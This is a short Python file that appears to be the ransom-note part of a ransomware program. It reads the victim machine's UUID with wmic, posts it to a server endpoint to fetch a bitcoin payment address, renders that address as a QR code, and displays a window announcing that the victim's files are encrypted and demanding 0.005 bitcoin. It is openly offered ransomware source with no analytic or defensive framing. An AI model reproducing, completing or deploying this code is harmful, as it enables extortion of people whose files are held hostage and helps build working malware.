import qrc
import requests as req
from  window  import Window
import subprocess

textOne = ":("
textTwo = "Looks like your files have been encrypted"
textThree= "Send 0.005 bitcoin to this adress to free your files : "



def get_uuid():
    cmd = "wmic csproduct get uuid"

    uuid = str(subprocess.check_output(cmd))
    pos1= uuid.find("\\n")+2
    uuid = uuid[pos1:-15]
    return '{' + str(uuid) + '}'


address = req.post("localhost/index.php?action=getPublicKey", data={"uuid": get_uuid()}).text

qrc = qrc.QRC(address)

wndw = Window()
wndw.addLabel(textOne, ("Calibri", 80), "#D70040", "white", 130, 180)
wndw.addLabel(textTwo, ("Calibri", 30), "#D70040", "white", 250, 230)
wndw.addLabel(textThree, ("Calibri", 18), "#D70040", "white", 250, 300)
wndw.addImage("qrcode.png", 770, 300)
wndw.run()


